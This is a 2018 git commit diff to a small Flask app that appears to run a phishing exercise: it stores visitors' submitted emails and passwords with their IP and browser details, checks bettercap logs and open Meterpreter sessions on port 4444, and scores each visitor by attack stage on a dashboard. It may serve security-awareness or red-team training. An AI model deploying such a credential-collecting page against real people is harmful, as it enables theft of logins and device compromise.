7e32c2b72dc5392f95a27cd3d0ec4d7b670efb60
B0rjitaaa <bmcx12@gmail.com>
2018-09-23 12:42:30 +0200

    Added points to template.

--- code/app.py
+++ code/app.py
@@ -9,6 +9,13 @@ app = Flask(__name__)
 
 FIELDNAMES = ['ip_addr', 'email','password','user_agent','platform', 'date', 'stage1','stage2', 'stage3', 'stage4']
 
+STAGES = {
+    'stage1': 1,
+    'stage2': 2,
+    'stage3': 3,
+    'stage4': 4,
+}
+
 
 def check_stage(log_file, ip_addr):
     with open(log_file) as f:
@@ -20,11 +27,23 @@ def check_meterpreter_session(ip_addr):
     return len([x for x in psutil.net_connections() if x.laddr.port == 4444 and x.raddr.ip == ip_addr]) > 0
 
 
+def calculate_stage():
+    input_file = csv.DictReader(open('log.csv', 'r'))
+    out = [ row for row in input_file ]
+    for line in out:
+        points = 0
+        for stage in STAGES:
+            if line[stage] == 'True':
+                points += STAGES[stage]
+        line.update({'points': points})
+    return out
+        
+
 @app.route('/', methods=['GET', 'POST'])
 def phishing_server():
     target = sys.argv[1]
     if request.method == 'POST':
-        with open('names.csv', 'w+', newline='') as csvfile:
+        with open('log.csv', 'w+', newline='') as csvfile:
             writer = csv.DictWriter(csvfile, fieldnames=FIELDNAMES)
             writer.writeheader()
             writer.writerow({
@@ -34,7 +53,7 @@ def phishing_server():
                 'user_agent': f'{request.user_agent.browser} - {request.user_agent.version}',
                 'platform': request.user_agent.platform,
                 'date': datetime.now().strftime('%H:%m %d-%m-%Y'),
-                'stage1': check_stage('log_bettercap.txt', request.remote_addr),
+                'stage1': check_stage('log_bettercap.txt', request.remote_addr) or request.remote_addr,
                 'stage2': True,
                 'stage3': check_meterpreter_session(request.remote_addr),
                 'stage4': True if request.form['email'] and request.form['password'] else False,
@@ -45,12 +64,10 @@ def phishing_server():
 
 @app.route('/dashboard', methods=['GET'])
 def dashboard():
-    input_file = csv.DictReader(open('names.csv', 'r'))
-    out = [ row for row in input_file ] 
-
+    
     return render_template(
         'dashboard.html', 
-        response=out, 
+        response=calculate_stage(), 
         name='dashboard'
     )
 
